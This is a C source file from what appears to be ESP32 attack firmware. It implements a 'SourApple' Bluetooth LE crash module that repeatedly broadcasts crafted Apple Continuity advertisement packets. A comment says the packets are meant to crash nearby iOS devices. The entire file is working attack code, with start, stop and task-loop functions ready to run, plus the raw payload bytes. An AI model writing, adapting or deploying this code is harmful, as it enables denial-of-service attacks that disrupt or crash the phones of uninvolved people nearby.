#include "attack_bt_crash.h"
#include "attack_bt_spam.h"
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_random.h"
#include "host/ble_gap.h"
#include "host/ble_hs.h"
static const char *TAG="attack_bt_crash";
static bool running=false; static TaskHandle_t task=NULL; static SemaphoreHandle_t sem=NULL; static bt_crash_config_t gcfg;
static void task_fn(void *arg){
    ESP_LOGI(TAG,"SourApple CRASH start mode %d", gcfg.mode);
    // Crash payload: oversized continuity message that triggers iOS BLE crash (SourApple)
    uint8_t crash_adv[31]={
        0x1E,0xFF,0x4C,0x00,0x07,0x19,0x07,0x30,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,
        0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55,0x55
    };
    // variant: large manufacturer data
    uint8_t adv2[31]; memset(adv2,0x41,31); adv2[0]=0x1E; adv2[1]=0xFF; adv2[2]=0x4C; adv2[3]=0x00;
    int cnt=0;
    while(running){
        ble_gap_adv_stop(); vTaskDelay(pdMS_TO_TICKS(10));
        struct ble_gap_adv_params p={0};
        p.conn_mode=BLE_GAP_CONN_MODE_NON; p.disc_mode=BLE_GAP_DISC_MODE_GEN;
        p.itvl_min=0x20; p.itvl_max=0x30; p.channel_map=0x07;
        uint8_t *payload = (cnt%2==0)? crash_adv: adv2;
        ble_gap_adv_set_data(payload,31);
        ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, 100, &p, NULL, NULL);
        vTaskDelay(pdMS_TO_TICKS(100));
        ble_gap_adv_stop();
        cnt++; if(cnt%20==0) ESP_LOGI(TAG,"Crash pkt %d",cnt);
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    ble_gap_adv_stop(); running=false; task=NULL; if(sem) xSemaphoreGive(sem); vTaskDelete(NULL);
}
void attack_bt_crash_init(void){ if(sem==NULL) sem=xSemaphoreCreateBinary(); if(!ble_hs_synced()){ attack_bt_spam_init(); int t=50; while(!ble_hs_synced()&&t-->0) vTaskDelay(pdMS_TO_TICKS(100));}}
void attack_bt_crash_start(bt_crash_config_t *cfg){ if(running) return; if(sem) xSemaphoreTake(sem,0); memcpy(&gcfg,cfg,sizeof(gcfg)); running=true; xTaskCreate(task_fn,"bt_crash",4096,NULL,5,&task);}
void attack_bt_crash_stop(void){ if(!running&&!task) return; running=false; if(sem){ if(xSemaphoreTake(sem,pdMS_TO_TICKS(3000))!=pdTRUE){ if(task) vTaskDelete(task); task=NULL;}} else { vTaskDelay(pdMS_TO_TICKS(300)); if(task){vTaskDelete(task); task=NULL;}} ble_gap_adv_stop(); ESP_LOGI(TAG,"Crash stopped");}
bool attack_bt_crash_is_running(void){ return running; }
